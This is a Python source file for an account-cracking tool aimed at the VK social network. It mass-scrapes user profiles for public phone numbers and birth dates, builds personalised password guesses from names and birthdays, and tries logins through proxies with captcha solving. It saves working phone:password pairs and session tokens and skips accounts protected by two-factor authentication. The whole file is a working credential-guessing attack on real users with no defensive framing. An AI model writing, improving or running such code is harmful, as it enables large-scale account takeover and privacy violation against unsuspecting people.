import os

from config.config import *
from passgen import PassGen
from tools import *

start_offset = int(open("config/offset.txt").readlines()[-1].replace('\n', ''))  # offset of user ids.
LOGIN_PASSWORD_SEPARATOR = ':'  # login:password = ':'; login@password = "@" ect.
valid_accounts = "./out/valid.list.txt"  # where we will write valid accounts
invalid_accounts = "./out/invalid.list.txt"  # where to write invalid accounts
errors_file = "./out/errors.log"  # where to write invalid accounts
name_syn_file = "config/syn.out.txt"  # where to write invalid accounts
threads = 1  # count of threads. If you have good internet connection ( and good proxy internet connection ), you can increase it


proxies_fname = "./config/proxies.txt"  # you may leave file empty
Worker.ProxyType = 'http://'  # your proxy type. If u wana use socks - https://stackoverflow.com/questions/12601316/how-to-make-python-requests-work-via-socks-proxy


checked_accounts = set()
valid_logins = set()
if os.path.exists(invalid_accounts):
    with open(invalid_accounts, encoding='utf-8') as file:
        checked_accounts = set(line.replace('\n', '').replace('\r', '') for line in file)
if os.path.exists(valid_accounts):
    with open(valid_accounts, encoding='utf-8') as file:
        for line in file:
            checked_accounts.add(line)
            valid_logins.add(line.split(LOGIN_PASSWORD_SEPARATOR)[0])
    with open(valid_accounts, 'a', encoding='utf-8') as file:
        file.write("\n")
with open(proxies_fname, encoding='utf-8') as file:
    Worker.Proxies = [i.replace('\n', '').replace('\r', '') for i in file]
with open(name_syn_file, encoding='utf-8') as file:
    synonyms = (i.replace('\n','').replace('\r','').split(' ') for i in file.readlines())
    synonyms = [i for i in synonyms if i]


class FinderWorker(Worker):
    RequestsLock = Lock()
    FileLock = Lock()
    RequestsCount = 5
    LoginsPasswordsToCheck = []
    AccountsChecked = 0
    ValidAccounts = 0
    ValidAccountsNo2FA = 0
    def _work(self):
        while 1:
            with Worker.Lock:
                if not Worker.Working: break
            self.one_hack_step()

    def _next_login_password(self) -> 'Tuple[str, str]':
        def valid(user):
            phone: str = user.get('mobile_phone')
            if not phone or not user.get("bdate"): return False
            phone = "".join(i for i in phone if i.isdigit())
            if phone.startswith("7") or phone.startswith("8"): phone = phone[1:]
            if len(phone) != 10: return False
            return True
        with self.RequestsLock:
            if self.LoginsPasswordsToCheck: return self.LoginsPasswordsToCheck.pop()
            users = []
            while not users:
                with Worker.Lock:
                    print(f"Parsing info of {colorama.Fore.CYAN}{self.RequestsCount*1000}{colorama.Fore.RESET} users")
                users = list(filter(valid, self.Api.method("execute", {"code": self._execute_code, 'lang': 'en'})))
                with Worker.Lock:
                    print(f"{colorama.Fore.CYAN}{len(users)}{colorama.Fore.RESET} users with public phone numbers".ljust(130))
            self._generate_logins_password(users)
            return self.LoginsPasswordsToCheck.pop()
    @staticmethod
    def _get_synonyms(first_name):
        for i in synonyms:
            if first_name in i:
                i = i[::]
                i.remove(first_name)
                return i
        return []
    def _generate_logins_password(self, users):
        c = 0
        for i in range(len(users)):
            user = users[i]
            phone = "".join(i for i in user['mobile_phone'] if i.isdigit())
            if phone.startswith("8"): phone = "7" + phone[1:]
            phone = "+"+phone
            if not phone.startswith("+79") or phone in valid_logins: continue
            p = PassGen(
                max_count=10,
                silent=True
            )

            first_name, last_name, nick = user['first_name'], user['last_name'], user['domain']
            if nick.startswith('id'): nick = ''
            nick2 = "".join(i for i in nick if i in string.ascii_letters)
            bdate = user['bdate'].split('.')
            if len(bdate) == 2:
                dd, mm = bdate
                yyyy = 0000
            elif len(bdate) == 3:
                dd, mm, yyyy = bdate
            else: continue
            bdate = {'day': dd, 'month': mm, 'year': int(yyyy)}
            p.target = {"firstname": first_name, "lastname": last_name, "nickname": nick, 'birthday': bdate}

            first_names = self._get_synonyms(first_name)
            if first_names: p.spouse = {"firstname": first_names[0], "lastname": last_name, "nickname": nick2, 'birthday': bdate}
            else: p.spouse = {"firstname": "", "lastname": "", "nickname": nick2, "birthday": bdate}
            if len(first_names) > 1: p.child = {"firstname": first_names[1], "lastname": last_name, "nickname": "", 'birthday': bdate}
            else: p.child = {"firstname": "", "lastname": "", "nickname": "", "birthday": ""}
            if len(first_names) > 2: p.pet = {"firstname": first_names[2], "lastname": last_name, "nickname": "", 'birthday': bdate}
            else: p.pet = {"firstname": "", "lastname": "", "nickname": "", "birthday": ""}
            p.generator(ignore_additional=True, write=False)
            for password in reversed(p.passwords_not_sorted):
                if f"{phone}{LOGIN_PASSWORD_SEPARATOR}{password}" not in checked_accounts:
                    self.LoginsPasswordsToCheck.append((phone, password))
                    c += 1
            FinderWorker.AccountsChecked += 1
        if c != 0:
            print(f"Found {colorama.Fore.CYAN}{c}{colorama.Fore.RESET} new login/password variations.".ljust(130, " "))
        else:
            print(f"Do not found any accounts. Maybe you should change start offset".ljust(130, ' '))
    @property
    def _execute_code(self):
        global start_offset
        items = [
            "ans = ans + API.users.get({user_ids:\"%s\", fields:\"%s\"})" % (",".join(
                map(str, range(start_offset+i*1000, start_offset+(i+1)*1000))
            ), 'contacts,bdate,domain')
            for i in range(0, self.RequestsCount)
        ]
        start_offset += self.RequestsCount * 1000
        code = f"var ans = [];{';'.join(items)}; return ans;"
        return code
    Api = vk_api.VkApi(token=access_token)

    def _on_pswd_found(self, login, password, api, need_2fa):
        if need_2fa:
            self._invalid_pswd(login, password)
        else:
            with self.FileLock:
                with open(valid_accounts, 'a', encoding='utf-8') as file:
                    file.write(login)
                    file.write(LOGIN_PASSWORD_SEPARATOR)
                    file.write(password)
                    if need_2fa:
                        file.write(f"{LOGIN_PASSWORD_SEPARATOR}2fa")
                    else:
                        file.write(LOGIN_PASSWORD_SEPARATOR)
                        file.write(api.token)
                    file.write('\n')
                with open(invalid_accounts, 'a', encoding='utf-8') as file:
                    for l, p in filter(lambda i:i[0]=='login', FinderWorker.LoginsPasswordsToCheck):
                        file.write(l)
                        file.write(LOGIN_PASSWORD_SEPARATOR)
                        file.write(p)
                        file.write('\n')
        with Worker.Lock:
            FinderWorker.ValidAccounts += 1
            if not need_2fa: FinderWorker.ValidAccountsNo2FA += 1
        with self.RequestsLock:
            FinderWorker.LoginsPasswordsToCheck = list(filter(lambda i: i[0] != login, FinderWorker.LoginsPasswordsToCheck))

    def _invalid_pswd(self, login, password):
        with self.FileLock:
            with open(invalid_accounts, 'a', encoding='utf-8') as file:
                file.write(login)
                file.write(LOGIN_PASSWORD_SEPARATOR)
                file.write(password)
                file.write('\n')
def status_thread():
    while 1:
        with Worker.Lock:
            if not Worker.Working: return
            print((f"Offset: {colorama.Fore.CYAN}{start_offset}{colorama.Fore.RESET}; "
                  f"Account checked: {colorama.Fore.CYAN}{FinderWorker.AccountsChecked}{colorama.Fore.RESET}; "
                   f"Total: {colorama.Fore.CYAN}{FinderWorker.ValidAccounts}{colorama.Fore.RESET}; "
                   f"Valid: {colorama.Fore.CYAN}{FinderWorker.ValidAccountsNo2FA}{colorama.Fore.RESET}").ljust(175, ' '))
            print(
                f"Captcha Progress: {colorama.Fore.GREEN}{str(solver.TOTAL_COUNT-solver.FAIL_COUNT).ljust(9,' ')}{colorama.Fore.RESET} success,",
                f"{colorama.Fore.RED}{str(solver.FAIL_COUNT).ljust(9, ' ')}{colorama.Fore.RESET} fail =",
                colorama.Fore.CYAN +
                f"{1 - solver.FAIL_COUNT / (solver.TOTAL_COUNT if solver.TOTAL_COUNT != 0 else 1):.2%}".ljust(7,' ')+
                colorama.Fore.RESET,
                f"{(1 / (solver.argv_solve_time or 1)):,.2f} captcha per second"
            )
            with open("config/offset.txt", 'a') as f: f.write(f"{start_offset}\n")

        time.sleep(60 * 6)

if __name__ == "__main__":
    threads = list(map(FinderWorker, range(threads)))

    for i in threads:
        i.start()
    threading.Thread(target=status_thread).start()
    try:
        for i in threads:
            i.join()
    finally:
        Worker.Working = False
